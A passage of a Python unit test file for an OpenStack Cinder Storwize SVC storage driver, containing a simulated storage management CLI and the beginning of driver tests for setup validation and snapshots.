volume_info['free_capacity'] = '0'\n            volume_info['warning'] = ''\n            volume_info['autoexpand'] = ''\n            volume_info['grainsize'] = ''\n            volume_info['compressed_copy'] = 'no'\n\n        if volume_info['name'] in self._volumes_list:\n            return self._errors['CMMVC6035E']\n        else:\n            self._volumes_list[volume_info['name']] = volume_info\n            return ('Virtual Disk, id [%s], successfully created' %\n                    (volume_info['id']), '')\n\n    # Delete a vdisk\n    def _cmd_rmvdisk(self, **kwargs):\n        force = True if 'force' in kwargs else False\n\n        if 'obj' not in kwargs:\n            return self._errors['CMMVC5701E']\n        vol_name = kwargs['obj'].strip('\\'\\'')\n\n        if vol_name not in self._volumes_list:\n            return self._errors['CMMVC5753E']\n\n        if not force:\n            for k, mapping in self._mappings_list.iteritems():\n                if mapping['vol'] == vol_name:\n                    return self._errors['CMMVC5840E']\n            for k, fcmap in self._fcmappings_list.iteritems():\n                if ((fcmap['source'] == vol_name) or\n                        (fcmap['target'] == vol_name)):\n                    return self._errors['CMMVC5840E']\n\n        del self._volumes_list[vol_name]\n        return ('', '')\n\n    def _cmd_expandvdisksize(self, **kwargs):\n        if 'obj' not in kwargs:\n            return self._errors['CMMVC5701E']\n        vol_name = kwargs['obj'].strip('\\'\\'')\n\n        # Assume unit is gb\n        if 'size' not in kwargs:\n            return self._errors['CMMVC5707E']\n        size = int(kwargs['size'])\n\n        if vol_name not in self._volumes_list:\n            return self._errors['CMMVC5753E']\n\n        curr_size = int(self._volumes_list[vol_name]['capacity'])\n        addition = size * units.GiB\n        self._volumes_list[vol_name]['capacity'] = str(curr_size + addition)\n        return ('', '')\n\n    def _get_fcmap_info(self, vol_name):\n        ret_vals = {\n            'fc_id': '',\n            'fc_name': '',\n            'fc_map_count': '0',\n        }\n        for k, fcmap in self._fcmappings_list.iteritems():\n            if ((fcmap['source'] == vol_name) or\n                    (fcmap['target'] == vol_name)):\n                ret_vals['fc_id'] = fcmap['id']\n                ret_vals['fc_name'] = fcmap['name']\n                ret_vals['fc_map_count'] = '1'\n        return ret_vals\n\n    # List information about vdisks\n    def _cmd_lsvdisk(self, **kwargs):\n        rows = []\n        rows.append(['id', 'name', 'IO_group_id', 'IO_group_name',\n                     'status', 'mdisk_grp_id', 'mdisk_grp_name',\n                     'capacity', 'type', 'FC_id', 'FC_name', 'RC_id',\n                     'RC_name', 'vdisk_UID', 'fc_map_count', 'copy_count',\n                     'fast_write_state', 'se_copy_count', 'RC_change'])\n\n        for k, vol in self._volumes_list.iteritems():\n            if (('filtervalue' not in kwargs) or\n                    (kwargs['filtervalue'] == 'name=' + vol['name'])):\n                fcmap_info = self._get_fcmap_info(vol['name'])\n\n                if 'bytes' in kwargs:\n                    cap = self._convert_bytes_units(vol['capacity'])\n                else:\n                    cap = vol['capacity']\n                rows.append([str(vol['id']), vol['name'], '0', 'io_grp0',\n                            'online', '0',\n                            self._flags['storwize_svc_volpool_name'],\n                            cap, 'striped',\n                            fcmap_info['fc_id'], fcmap_info['fc_name'],\n                            '', '', vol['uid'],\n                            fcmap_info['fc_map_count'], '1', 'empty',\n                            '1', 'no'])\n\n        if 'obj' not in kwargs:\n            return self._print_info_cmd(rows=rows, **kwargs)\n        else:\n            if kwargs['obj'] not in self._volumes_list:\n                return self._errors['CMMVC5754E']\n            vol = self._volumes_list[kwargs['obj']]\n            fcmap_info = self._get_fcmap_info(vol['name'])\n            cap = vol['capacity']\n            cap_u = vol['used_capacity']\n            cap_r = vol['real_capacity']\n            cap_f = vol['free_capacity']\n            if 'bytes' not in kwargs:\n                for item in [cap, cap_u, cap_r, cap_f]:\n                    item = self._convert_bytes_units(item)\n            rows = []\n\n            rows.append(['id', str(vol['id'])])\n            rows.append(['name', vol['name']])\n            rows.append(['IO_group_id', '0'])\n            rows.append(['IO_group_name', 'io_grp0'])\n            rows.append(['status', 'online'])\n            rows.append(['mdisk_grp_id', '0'])\n            rows.append([\n                'mdisk_grp_name',\n                self._flags['storwize_svc_volpool_name']])\n            rows.append(['capacity', cap])\n            rows.append(['type', 'striped'])\n            rows.append(['formatted', 'no'])\n            rows.append(['mdisk_id', ''])\n            rows.append(['mdisk_name', ''])\n            rows.append(['FC_id', fcmap_info['fc_id']])\n            rows.append(['FC_name', fcmap_info['fc_name']])\n            rows.append(['RC_id', ''])\n            rows.append(['RC_name', ''])\n            rows.append(['vdisk_UID', vol['uid']])\n            rows.append(['throttling', '0'])\n\n            if self._next_cmd_error['lsvdisk'] == 'blank_pref_node':\n                rows.append(['preferred_node_id', ''])\n                self._next_cmd_error['lsvdisk'] = ''\n            elif self._next_cmd_error['lsvdisk'] == 'no_pref_node':\n                self._next_cmd_error['lsvdisk'] = ''\n            else:\n                rows.append(['preferred_node_id', '1'])\n            rows.append(['fast_write_state', 'empty'])\n            rows.append(['cache', 'readwrite'])\n            rows.append(['udid', ''])\n            rows.append(['fc_map_count', fcmap_info['fc_map_count']])\n            rows.append(['sync_rate', '50'])\n            rows.append(['copy_count', '1'])\n            rows.append(['se_copy_count', '0'])\n            rows.append(['mirror_write_priority', 'latency'])\n            rows.append(['RC_change', 'no'])\n            rows.append(['used_capacity', cap_u])\n            rows.append(['real_capacity', cap_r])\n            rows.append(['free_capacity', cap_f])\n            rows.append(['autoexpand', vol['autoexpand']])\n            rows.append(['warning', vol['warning']])\n            rows.append(['grainsize', vol['grainsize']])\n            rows.append(['easy_tier', vol['easy_tier']])\n            rows.append(['compressed_copy', vol['compressed_copy']])\n\n            if 'nohdr' in kwargs:\n                for index in range(len(rows)):\n                    rows[index] = ' '.join(rows[index][1:])\n\n            if 'delim' in kwargs:\n                for index in range(len(rows)):\n                    rows[index] = kwargs['delim'].join(rows[index])\n\n            return ('%s' % '\\n'.join(rows), '')\n\n    def _add_port_to_host(self, host_info, **kwargs):\n        if 'iscsiname' in kwargs:\n            added_key = 'iscsi_names'\n            added_val = kwargs['iscsiname'].strip('\\'\\\"')\n        elif 'hbawwpn' in kwargs:\n            added_key = 'wwpns'\n            added_val = kwargs['hbawwpn'].strip('\\'\\\"')\n        else:\n            return self._errors['CMMVC5707E']\n\n        host_info[added_key].append(added_val)\n\n        for k, v in self._hosts_list.iteritems():\n            if v['id'] == host_info['id']:\n                continue\n            for port in v[added_key]:\n                if port == added_val:\n                    return self._errors['CMMVC6581E']\n        return ('', '')\n\n    # Make a host\n    def _cmd_mkhost(self, **kwargs):\n        host_info = {}\n        host_info['id'] = self._find_unused_id(self._hosts_list)\n\n        if 'name' in kwargs:\n            host_name = kwargs['name'].strip('\\'\\\"')\n        else:\n            host_name = 'host' + str(host_info['id'])\n\n        if self._is_invalid_name(host_name):\n            return self._errors['CMMVC6527E']\n\n        if host_name in self._hosts_list:\n            return self._errors['CMMVC6035E']\n\n        host_info['host_name'] = host_name\n        host_info['iscsi_names'] = []\n        host_info['wwpns'] = []\n\n        out, err = self._add_port_to_host(host_info, **kwargs)\n        if not len(err):\n            self._hosts_list[host_name] = host_info\n            return ('Host, id [%s], successfully created' %\n                    (host_info['id']), '')\n        else:\n            return (out, err)\n\n    # Add ports to an existing host\n    def _cmd_addhostport(self, **kwargs):\n        if 'obj' not in kwargs:\n            return self._errors['CMMVC5701E']\n        host_name = kwargs['obj'].strip('\\'\\'')\n\n        if host_name not in self._hosts_list:\n            return self._errors['CMMVC5753E']\n\n        host_info = self._hosts_list[host_name]\n        return self._add_port_to_host(host_info, **kwargs)\n\n    # Change host properties\n    def _cmd_chhost(self, **kwargs):\n        if 'chapsecret' not in kwargs:\n            return self._errors['CMMVC5707E']\n        secret = kwargs['obj'].strip('\\'\\'')\n\n        if 'obj' not in kwargs:\n            return self._errors['CMMVC5701E']\n        host_name = kwargs['obj'].strip('\\'\\'')\n\n        if host_name not in self._hosts_list:\n            return self._errors['CMMVC5753E']\n\n        self._hosts_list[host_name]['chapsecret'] = secret\n        return ('', '')\n\n    # Remove a host\n    def _cmd_rmhost(self, **kwargs):\n        if 'obj' not in kwargs:\n            return self._errors['CMMVC5701E']\n\n        host_name = kwargs['obj'].strip('\\'\\'')\n        if host_name not in self._hosts_list:\n            return self._errors['CMMVC5753E']\n\n        for k, v in self._mappings_list.iteritems():\n            if (v['host'] == host_name):\n                return self._errors['CMMVC5871E']\n\n        del self._hosts_list[host_name]\n        return ('', '')\n\n    # List information about hosts\n    def _cmd_lshost(self, **kwargs):\n        if 'obj' not in kwargs:\n            rows = []\n            rows.append(['id', 'name', 'port_count', 'iogrp_count', 'status'])\n\n            found = False\n            for k, host in self._hosts_list.iteritems():\n                filterstr = 'name=' + host['host_name']\n                if (('filtervalue' not in kwargs) or\n                        (kwargs['filtervalue'] == filterstr)):\n                    rows.append([host['id'], host['host_name'], '1', '4',\n                                'offline'])\n                    found = True\n            if found:\n                return self._print_info_cmd(rows=rows, **kwargs)\n            else:\n                return ('', '')\n        else:\n            if kwargs['obj'] not in self._hosts_list:\n                return self._errors['CMMVC5754E']\n            host = self._hosts_list[kwargs['obj']]\n            rows = []\n            rows.append(['id', host['id']])\n            rows.append(['name', host['host_name']])\n            rows.append(['port_count', '1'])\n            rows.append(['type', 'generic'])\n            rows.append(['mask', '1111'])\n            rows.append(['iogrp_count', '4'])\n            rows.append(['status', 'online'])\n            for port in host['iscsi_names']:\n                rows.append(['iscsi_name', port])\n                rows.append(['node_logged_in_count', '0'])\n                rows.append(['state', 'offline'])\n            for port in host['wwpns']:\n                rows.append(['WWPN', port])\n                rows.append(['node_logged_in_count', '0'])\n                rows.append(['state', 'active'])\n\n            if 'nohdr' in kwargs:\n                for index in range(len(rows)):\n                    rows[index] = ' '.join(rows[index][1:])\n\n            if 'delim' in kwargs:\n                for index in range(len(rows)):\n                    rows[index] = kwargs['delim'].join(rows[index])\n\n            return ('%s' % '\\n'.join(rows), '')\n\n    # List iSCSI authorization information about hosts\n    def _cmd_lsiscsiauth(self, **kwargs):\n        if self._next_cmd_error['lsiscsiauth'] == 'no_info':\n            self._next_cmd_error['lsiscsiauth'] = ''\n            return ('', '')\n        rows = []\n        rows.append(['type', 'id', 'name', 'iscsi_auth_method',\n                     'iscsi_chap_secret'])\n\n        for k, host in self._hosts_list.iteritems():\n            method = 'none'\n            secret = ''\n            if 'chapsecret' in host:\n                method = 'chap'\n                secret = host['chapsecret']\n            rows.append(['host', host['id'], host['host_name'], method,\n                         secret])\n        return self._print_info_cmd(rows=rows, **kwargs)\n\n    # Create a vdisk-host mapping\n    def _cmd_mkvdiskhostmap(self, **kwargs):\n        mapping_info = {}\n        mapping_info['id'] = self._find_unused_id(self._mappings_list)\n\n        if 'host' not in kwargs:\n            return self._errors['CMMVC5707E']\n        mapping_info['host'] = kwargs['host'].strip('\\'\\'')\n\n        if 'scsi' not in kwargs:\n            return self._errors['CMMVC5707E']\n        mapping_info['lun'] = kwargs['scsi'].strip('\\'\\'')\n\n        if 'obj' not in kwargs:\n            return self._errors['CMMVC5707E']\n        mapping_info['vol'] = kwargs['obj'].strip('\\'\\'')\n\n        if mapping_info['vol'] not in self._volumes_list:\n            return self._errors['CMMVC5753E']\n\n        if mapping_info['host'] not in self._hosts_list:\n            return self._errors['CMMVC5754E']\n\n        if mapping_info['vol'] in self._mappings_list:\n            return self._errors['CMMVC6071E']\n\n        for k, v in self._mappings_list.iteritems():\n            if ((v['host'] == mapping_info['host']) and\n                    (v['lun'] == mapping_info['lun'])):\n                return self._errors['CMMVC5879E']\n\n        for k, v in self._mappings_list.iteritems():\n            if (v['lun'] == mapping_info['lun']) and ('force' not in kwargs):\n                return self._errors['CMMVC6071E']\n\n        self._mappings_list[mapping_info['id']] = mapping_info\n        return ('Virtual Disk to Host map, id [%s], successfully created'\n                % (mapping_info['id']), '')\n\n    # Delete a vdisk-host mapping\n    def _cmd_rmvdiskhostmap(self, **kwargs):\n        if 'host' not in kwargs:\n            return self._errors['CMMVC5707E']\n        host = kwargs['host'].strip('\\'\\'')\n\n        if 'obj' not in kwargs:\n            return self._errors['CMMVC5701E']\n        vol = kwargs['obj'].strip('\\'\\'')\n\n        mapping_ids = []\n        for k, v in self._mappings_list.iteritems():\n            if v['vol'] == vol:\n                mapping_ids.append(v['id'])\n        if not mapping_ids:\n            return self._errors['CMMVC5753E']\n\n        this_mapping = None\n        for mapping_id in mapping_ids:\n            if self._mappings_list[mapping_id]['host'] == host:\n                this_mapping = mapping_id\n        if this_mapping == None:\n            return self._errors['CMMVC5753E']\n\n        del self._mappings_list[this_mapping]\n        return ('', '')\n\n    # List information about vdisk-host mappings\n    def _cmd_lshostvdiskmap(self, **kwargs):\n        index = 1\n        no_hdr = 0\n        delimeter = ''\n        host_name = kwargs['obj']\n\n        if host_name not in self._hosts_list:\n            return self._errors['CMMVC5754E']\n\n        rows = []\n        rows.append(['id', 'name', 'SCSI_id', 'vdisk_id', 'vdisk_name',\n                     'vdisk_UID'])\n\n        for k, mapping in self._mappings_list.iteritems():\n            if (host_name == '') or (mapping['host'] == host_name):\n                volume = self._volumes_list[mapping['vol']]\n                rows.append([mapping['id'], mapping['host'],\n                            mapping['lun'], volume['id'],\n                            volume['name'], volume['uid']])\n\n        return self._print_info_cmd(rows=rows, **kwargs)\n\n    # Create a FlashCopy mapping\n    def _cmd_mkfcmap(self, **kwargs):\n        source = ''\n        target = ''\n        copyrate = kwargs['copyrate'] if 'copyrate' in kwargs else '50'\n\n        if 'source' not in kwargs:\n            return self._errors['CMMVC5707E']\n        source = kwargs['source'].strip('\\'\\'')\n        if source not in self._volumes_list:\n            return self._errors['CMMVC5754E']\n\n        if 'target' not in kwargs:\n            return self._errors['CMMVC5707E']\n        target = kwargs['target'].strip('\\'\\'')\n        if target not in self._volumes_list:\n            return self._errors['CMMVC5754E']\n\n        if source == target:\n            return self._errors['CMMVC6303E']\n\n        if (self._volumes_list[source]['capacity'] !=\n                self._volumes_list[target]['capacity']):\n            return self._errors['CMMVC5924E']\n\n        fcmap_info = {}\n        fcmap_info['source'] = source\n        fcmap_info['target'] = target\n        fcmap_info['id'] = self._find_unused_id(self._fcmappings_list)\n        fcmap_info['name'] = 'fcmap' + fcmap_info['id']\n        fcmap_info['copyrate'] = copyrate\n        fcmap_info['progress'] = '0'\n        fcmap_info['autodelete'] = True if 'autodelete' in kwargs else False\n        fcmap_info['status'] = 'idle_or_copied'\n        self._fcmappings_list[fcmap_info['id']] = fcmap_info\n\n        return('FlashCopy Mapping, id [' + fcmap_info['id'] +\n               '], successfully created', '')\n\n    def _cmd_gen_prestartfcmap(self, **kwargs):\n        if 'obj' not in kwargs:\n            return self._errors['CMMVC5701E']\n        id_num = kwargs['obj']\n\n        if self._next_cmd_error['prestartfcmap'] == 'bad_id':\n            id_num = -1\n            self._next_cmd_error['prestartfcmap'] = ''\n\n        try:\n            fcmap = self._fcmappings_list[id_num]\n        except KeyError:\n            return self._errors['CMMVC5753E']\n\n        return self._state_transition('prepare', fcmap)\n\n    def _cmd_gen_startfcmap(self, **kwargs):\n        if 'obj' not in kwargs:\n            return self._errors['CMMVC5701E']\n        id_num = kwargs['obj']\n\n        if self._next_cmd_error['startfcmap'] == 'bad_id':\n            id_num = -1\n            self._next_cmd_error['startfcmap'] = ''\n\n        try:\n            fcmap = self._fcmappings_list[id_num]\n        except KeyError:\n            return self._errors['CMMVC5753E']\n\n        return self._state_transition('start', fcmap)\n\n    def _cmd_stopfcmap(self, **kwargs):\n        if 'obj' not in kwargs:\n            return self._errors['CMMVC5701E']\n        id_num = kwargs['obj']\n\n        try:\n            fcmap = self._fcmappings_list[id_num]\n        except KeyError:\n            return self._errors['CMMVC5753E']\n\n        return self._state_transition('stop', fcmap)\n\n    def _cmd_rmfcmap(self, **kwargs):\n        if 'obj' not in kwargs:\n            return self._errors['CMMVC5701E']\n        id_num = kwargs['obj']\n        force = True if 'force' in kwargs else False\n\n        if self._next_cmd_error['rmfcmap'] == 'bad_id':\n            id_num = -1\n            self._next_cmd_error['rmfcmap'] = ''\n\n        try:\n            fcmap = self._fcmappings_list[id_num]\n        except KeyError:\n            return self._errors['CMMVC5753E']\n\n        function = 'delete_force' if force else 'delete'\n        ret = self._state_transition(function, fcmap)\n        if fcmap['status'] == 'end':\n            del self._fcmappings_list[id_num]\n        return ret\n\n    def _cmd_lsvdiskfcmappings(self, **kwargs):\n        if 'obj' not in kwargs:\n            return self._errors['CMMVC5707E']\n        vdisk = kwargs['obj']\n        rows = []\n        rows.append(['id', 'name'])\n        for k, v in self._fcmappings_list.iteritems():\n            if v['source'] == vdisk or v['target'] == vdisk:\n                rows.append([v['id'], v['name']])\n        return self._print_info_cmd(rows=rows, **kwargs)\n\n    def _cmd_chfcmap(self, **kwargs):\n        if 'obj' not in kwargs:\n            return self._errors['CMMVC5707E']\n        id_num = kwargs['obj']\n\n        try:\n            fcmap = self._fcmappings_list[id_num]\n        except KeyError:\n            return self._errors['CMMVC5753E']\n\n        for key in ['name', 'copyrate', 'autodelete']:\n            if key in kwargs:\n                fcmap[key] = kwargs[key]\n        return ('', '')\n\n    def _cmd_lsfcmap(self, **kwargs):\n        rows = []\n        rows.append(['id', 'name', 'source_vdisk_id', 'source_vdisk_name',\n                     'target_vdisk_id', 'target_vdisk_name', 'group_id',\n                     'group_name', 'status', 'progress', 'copy_rate',\n                     'clean_progress', 'incremental', 'partner_FC_id',\n                     'partner_FC_name', 'restoring', 'start_time',\n                     'rc_controlled'])\n\n        # Assume we always get a filtervalue argument\n        filter_key = kwargs['filtervalue'].split('=')[0]\n        filter_value = kwargs['filtervalue'].split('=')[1]\n        to_delete = []\n        for k, v in self._fcmappings_list.iteritems():\n            if str(v[filter_key]) == filter_value:\n                source = self._volumes_list[v['source']]\n                target = self._volumes_list[v['target']]\n                self._state_transition('wait', v)\n\n                if self._next_cmd_error['lsfcmap'] == 'speed_up':\n                    self._next_cmd_error['lsfcmap'] = ''\n                    curr_state = v['status']\n                    while self._state_transition('wait', v) == (\"\", \"\"):\n                        if curr_state == v['status']:\n                            break\n                        curr_state = v['status']\n\n                if ((v['status'] == 'idle_or_copied' and v['autodelete'] and\n                     v['progress'] == '100') or (v['status'] == 'end')):\n                    to_delete.append(k)\n                else:\n                    rows.append([v['id'], v['name'], source['id'],\n                                source['name'], target['id'], target['name'],\n                                '', '', v['status'], v['progress'],\n                                v['copyrate'], '100', 'off', '', '', 'no', '',\n                                'no'])\n\n        for d in to_delete:\n            del self._fcmappings_list[k]\n\n        return self._print_info_cmd(rows=rows, **kwargs)\n\n    # Add host to list\n    def _add_host_to_list(self, connector):\n        host_info = {}\n        host_info['id'] = self._find_unused_id(self._hosts_list)\n        host_info['host_name'] = connector['host']\n        host_info['iscsi_names'] = []\n        host_info['wwpns'] = []\n        if 'initiator' in connector:\n            host_info['iscsi_names'].append(connector['initiator'])\n        if 'wwpns' in connector:\n            host_info['wwpns'] = host_info['wwpns'] + connector['wwpns']\n        self._hosts_list[connector['host']] = host_info\n\n    # The main function to run commands on the management simulator\n    def execute_command(self, cmd, check_exit_code=True):\n        try:\n            kwargs = self._cmd_to_dict(cmd)\n        except IndexError:\n            return self._errors['CMMVC5707E']\n\n        command = kwargs['cmd']\n        del kwargs['cmd']\n\n        if command == 'lsmdiskgrp':\n            out, err = self._cmd_lsmdiskgrp(**kwargs)\n        elif command == 'lslicense':\n            out, err = self._cmd_lslicense(**kwargs)\n        elif command == 'lssystem':\n            out, err = self._cmd_lssystem(**kwargs)\n        elif command == 'lsnodecanister':\n            out, err = self._cmd_lsnodecanister(**kwargs)\n        elif command == 'lsnode':\n            out, err = self._cmd_lsnode(**kwargs)\n        elif command == 'lsportip':\n            out, err = self._cmd_lsportip(**kwargs)\n        elif command == 'lsfabric':\n            out, err = self._cmd_lsfabric(**kwargs)\n        elif command == 'mkvdisk':\n            out, err = self._cmd_mkvdisk(**kwargs)\n        elif command == 'rmvdisk':\n            out, err = self._cmd_rmvdisk(**kwargs)\n        elif command == 'expandvdisksize':\n            out, err = self._cmd_expandvdisksize(**kwargs)\n        elif command == 'lsvdisk':\n            out, err = self._cmd_lsvdisk(**kwargs)\n        elif command == 'mkhost':\n            out, err = self._cmd_mkhost(**kwargs)\n        elif command == 'addhostport':\n            out, err = self._cmd_addhostport(**kwargs)\n        elif command == 'chhost':\n            out, err = self._cmd_chhost(**kwargs)\n        elif command == 'rmhost':\n            out, err = self._cmd_rmhost(**kwargs)\n        elif command == 'lshost':\n            out, err = self._cmd_lshost(**kwargs)\n        elif command == 'lsiscsiauth':\n            out, err = self._cmd_lsiscsiauth(**kwargs)\n        elif command == 'mkvdiskhostmap':\n            out, err = self._cmd_mkvdiskhostmap(**kwargs)\n        elif command == 'rmvdiskhostmap':\n            out, err = self._cmd_rmvdiskhostmap(**kwargs)\n        elif command == 'lshostvdiskmap':\n            out, err = self._cmd_lshostvdiskmap(**kwargs)\n        elif command == 'mkfcmap':\n            out, err = self._cmd_mkfcmap(**kwargs)\n        elif command == 'prestartfcmap':\n            out, err = self._cmd_gen_prestartfcmap(**kwargs)\n        elif command == 'startfcmap':\n            out, err = self._cmd_gen_startfcmap(**kwargs)\n        elif command == 'stopfcmap':\n            out, err = self._cmd_stopfcmap(**kwargs)\n        elif command == 'rmfcmap':\n            out, err = self._cmd_rmfcmap(**kwargs)\n        elif command == 'chfcmap':\n            out, err = self._cmd_chfcmap(**kwargs)\n        elif command == 'lsfcmap':\n            out, err = self._cmd_lsfcmap(**kwargs)\n        elif command == 'lsvdiskfcmappings':\n            out, err = self._cmd_lsvdiskfcmappings(**kwargs)\n        else:\n            out, err = ('', 'ERROR: Unsupported command')\n\n        if (check_exit_code) and (len(err) != 0):\n            raise exception.ProcessExecutionError(exit_code=1,\n                                                  stdout=out,\n                                                  stderr=err,\n                                                  cmd=' '.join(cmd))\n\n        return (out, err)\n\n    # After calling this function, the next call to the specified command will\n    # result in in the error specified\n    def error_injection(self, cmd, error):\n        self._next_cmd_error[cmd] = error\n\n\nclass StorwizeSVCFakeDriver(storwize_svc.StorwizeSVCDriver):\n    def __init__(self, *args, **kwargs):\n        super(StorwizeSVCFakeDriver, self).__init__(*args, **kwargs)\n\n    def set_fake_storage(self, fake):\n        self.fake_storage = fake\n\n    def _run_ssh(self, cmd, check_exit_code=True):\n        try:\n            LOG.debug(_('Run CLI command: %s') % cmd)\n            ret = self.fake_storage.execute_command(cmd, check_exit_code)\n            (stdout, stderr) = ret\n            LOG.debug(_('CLI output:\\n stdout: %(stdout)s\\n stderr: '\n                        '%(stderr)s') % {'stdout': stdout, 'stderr': stderr})\n\n        except exception.ProcessExecutionError as e:\n            with excutils.save_and_reraise_exception():\n                LOG.debug(_('CLI Exception output:\\n stdout: %(out)s\\n '\n                            'stderr: %(err)s') % {'out': e.stdout,\n                                                  'err': e.stderr})\n\n        return ret\n\n\nclass StorwizeSVCFakeSock:\n    def settimeout(self, time):\n        return\n\n\nclass StorwizeSVCDriverTestCase(test.TestCase):\n    def setUp(self):\n        super(StorwizeSVCDriverTestCase, self).setUp()\n        self.USESIM = True\n        if self.USESIM:\n            self.driver = StorwizeSVCFakeDriver(\n                configuration=conf.Configuration(None))\n            self._def_flags = {'san_ip': 'hostname',\n                               'san_login': 'user',\n                               'san_password': 'pass',\n                               'storwize_svc_flashcopy_timeout': 20,\n                               # Test ignore capitalization\n                               'storwize_svc_connection_protocol': 'iScSi',\n                               'storwize_svc_multipath_enabled': False}\n            wwpns = [str(random.randint(0, 9999999999999999)).zfill(16),\n                     str(random.randint(0, 9999999999999999)).zfill(16)]\n            initiator = 'test.initiator.%s' % str(random.randint(10000, 99999))\n            self._connector = {'ip': '1.234.56.78',\n                               'host': 'storwize-svc-test',\n                               'wwpns': wwpns,\n                               'initiator': initiator}\n            self.sim = StorwizeSVCManagementSimulator('volpool')\n\n            self.driver.set_fake_storage(self.sim)\n        else:\n            self.driver = storwize_svc.StorwizeSVCDriver(\n                configuration=conf.Configuration(None))\n            self._def_flags = {'san_ip': '1.111.11.11',\n                               'san_login': 'user',\n                               'san_password': 'password',\n                               'storwize_svc_volpool_name': 'openstack',\n                               # Test ignore capitalization\n                               'storwize_svc_connection_protocol': 'iScSi',\n                               'storwize_svc_multipath_enabled': False,\n                               'ssh_conn_timeout': 0}\n            config_group = self.driver.configuration.config_group\n            self.driver.configuration.set_override('rootwrap_config',\n                                                   '/etc/cinder/rootwrap.conf',\n                                                   config_group)\n            self._connector = connector.get_connector_properties()\n\n        self._reset_flags()\n        self.driver.db = StorwizeSVCFakeDB()\n        self.driver.do_setup(None)\n        self.driver.check_for_setup_error()\n        self.stubs.Set(storwize_svc.time, 'sleep', lambda s: None)\n\n    def _set_flag(self, flag, value):\n        group = self.driver.configuration.config_group\n        self.driver.configuration.set_override(flag, value, group)\n\n    def _reset_flags(self):\n        self.driver.configuration.local_conf.reset()\n        for k, v in self._def_flags.iteritems():\n            self._set_flag(k, v)\n\n    def _assert_vol_exists(self, name, exists):\n        is_vol_defined = self.driver._is_vdisk_defined(name)\n        self.assertEqual(is_vol_defined, exists)\n\n    def test_storwize_svc_connectivity(self):\n        # Make sure we detect if the pool doesn't exist\n        no_exist_pool = 'i-dont-exist-%s' % random.randint(10000, 99999)\n        self._set_flag('storwize_svc_volpool_name', no_exist_pool)\n        self.assertRaises(exception.InvalidInput,\n                          self.driver.do_setup, None)\n        self._reset_flags()\n\n        # Check the case where the user didn't configure IP addresses\n        # as well as receiving unexpected results from the storage\n        if self.USESIM:\n            self.sim.error_injection('lsnodecanister', 'header_mismatch')\n            self.assertRaises(exception.VolumeBackendAPIException,\n                              self.driver.do_setup, None)\n            self.sim.error_injection('lsnodecanister', 'remove_field')\n            self.assertRaises(exception.VolumeBackendAPIException,\n                              self.driver.do_setup, None)\n            self.sim.error_injection('lsportip', 'header_mismatch')\n            self.assertRaises(exception.VolumeBackendAPIException,\n                              self.driver.do_setup, None)\n            self.sim.error_injection('lsportip', 'remove_field')\n            self.assertRaises(exception.VolumeBackendAPIException,\n                              self.driver.do_setup, None)\n\n        # Check with bad parameters\n        self._set_flag('san_ip', '')\n        self.assertRaises(exception.InvalidInput,\n                          self.driver.check_for_setup_error)\n        self._reset_flags()\n\n        self._set_flag('san_password', None)\n        self._set_flag('san_private_key', None)\n        self.assertRaises(exception.InvalidInput,\n                          self.driver.check_for_setup_error)\n        self._reset_flags()\n\n        self._set_flag('storwize_svc_vol_rsize', 101)\n        self.assertRaises(exception.InvalidInput,\n                          self.driver.check_for_setup_error)\n        self._reset_flags()\n\n        self._set_flag('storwize_svc_vol_warning', 101)\n        self.assertRaises(exception.InvalidInput,\n                          self.driver.check_for_setup_error)\n        self._reset_flags()\n\n        self._set_flag('storwize_svc_vol_grainsize', 42)\n        self.assertRaises(exception.InvalidInput,\n                          self.driver.check_for_setup_error)\n        self._reset_flags()\n\n        self._set_flag('storwize_svc_flashcopy_timeout', 601)\n        self.assertRaises(exception.InvalidInput,\n                          self.driver.check_for_setup_error)\n        self._reset_flags()\n\n        self._set_flag('storwize_svc_vol_compression', True)\n        self._set_flag('storwize_svc_vol_rsize', -1)\n        self.assertRaises(exception.InvalidInput,\n                          self.driver.check_for_setup_error)\n        self._reset_flags()\n\n        self._set_flag('storwize_svc_connection_protocol', 'foo')\n        self.assertRaises(exception.InvalidInput,\n                          self.driver.check_for_setup_error)\n        self._reset_flags()\n\n        self._set_flag('storwize_svc_connection_protocol', 'iSCSI')\n        self._set_flag('storwize_svc_multipath_enabled', True)\n        self.assertRaises(exception.InvalidInput,\n                          self.driver.check_for_setup_error)\n        self._reset_flags()\n\n        if self.USESIM:\n            self.sim.error_injection('lslicense', 'no_compression')\n            self._set_flag('storwize_svc_vol_compression', True)\n            self.driver.do_setup(None)\n            self.assertRaises(exception.InvalidInput,\n                              self.driver.check_for_setup_error)\n            self._reset_flags()\n\n        # Finally, check with good parameters\n        self.driver.do_setup(None)\n\n    def _generate_vol_info(self, vol_name, vol_id):\n        rand_id = str(random.randint(10000, 99999))\n        if vol_name:\n            return {'name': 'snap_volume%s' % rand_id,\n                    'volume_name': vol_name,\n                    'id': rand_id,\n                    'volume_id': vol_id,\n                    'volume_size': 10}\n        else:\n            return {'name': 'test_volume%s' % rand_id,\n                    'size': 10,\n                    'id': '%s' % rand_id,\n                    'volume_type_id': None}\n\n    def _create_test_vol(self, opts):\n        ctxt = context.get_admin_context()\n        type_ref = volume_types.create(ctxt, 'testtype', opts)\n        volume = self._generate_vol_info(None, None)\n        volume['volume_type_id'] = type_ref['id']\n        self.driver.create_volume(volume)\n\n        attrs = self.driver._get_vdisk_attributes(volume['name'])\n        self.driver.delete_volume(volume)\n        volume_types.destroy(ctxt, type_ref['id'])\n        return attrs\n\n    def _fail_prepare_fc_map(self, fc_map_id, source, target):\n        raise exception.ProcessExecutionError(exit_code=1,\n                                              stdout='',\n                                              stderr='unit-test-fail',\n                                              cmd='prestartfcmap id')\n\n    def test_storwize_svc_snapshots(self):\n        vol1 = self._generate_vol_info(None, None)\n        self.driver.create_volume(vol1)\n        self.driver.db.volume_set(vol1)\n        snap1 = self._generate_vol_info(vol1['name'], vol1['id'])\n\n        # Test timeout and volume cleanup\n        self._set_flag('storwize_svc_flashcopy_timeout', 1)\n        self.assertRaises(exception.InvalidSnapshot,\n                          self.driver.create_snapshot, snap1)\n        self._assert_vol_exists(snap1['name'], False)\n        self._reset_flags()\n\n        # Test prestartfcmap, startfcmap, and rmfcmap failing\n        orig = self.driver._call_prepare_fc_map\n        self.driver._call_prepare_fc_map = self._fail_prepare_fc_map\n        self.assertRaises(exception.ProcessExecutionError,\n                          self.driver.create_snapshot, snap1)\n        self.driver._call_prepare_fc_map = orig\n\n        if self.USESIM:\n            self.sim.error_injection('lsfcmap', 'speed_up')\n            self.sim.error_injection('startfcmap', 'bad_id')\n            self.assertRaises(exception.ProcessExecutionError,\n                              self.driver.create_snapshot, 